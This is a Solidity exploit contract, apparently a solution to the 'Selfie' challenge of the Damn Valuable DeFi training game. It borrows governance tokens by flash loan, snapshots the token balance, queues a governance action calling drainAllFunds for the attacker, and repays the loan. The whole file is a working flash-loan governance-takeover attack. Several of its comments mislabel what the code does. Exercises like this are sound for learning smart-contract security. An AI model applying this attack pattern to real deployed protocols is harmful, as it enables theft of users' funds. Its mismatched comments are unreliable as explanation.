pragma solidity ^0.6.0;

import "../SelfiePool.sol";
import "../SimpleGovernance.sol";
import "../../DamnValuableTokenSnapshot.sol";

contract AttackerSelfie {

    SimpleGovernance public simpleGovernance;
    SelfiePool public selfiePool;

    uint256 public actionId;

    constructor(
        address simpleGovernanceAddress,
        address selfiePoolAddress
    ) public {
        simpleGovernance = SimpleGovernance(simpleGovernanceAddress);
        selfiePool = SelfiePool(selfiePoolAddress);
    }

    function receiveTokens(DamnValuableTokenSnapshot token, uint256 amount) public {

        // Approve the deposit
        token.snapshot();

        token.transfer(msg.sender, amount);

        // Deposit the liquidity token and trigger new round
        actionId = simpleGovernance.queueAction(
                address(selfiePool),
                abi.encodeWithSignature(
                    "drainAllFunds(address)",
                    tx.origin
                ),
                0
        );
    }

    function attack(uint256 amount) public {
        // Initiate the flash loan and trigger receiveFlashLoan()
        selfiePool.flashLoan(amount);
    }

}
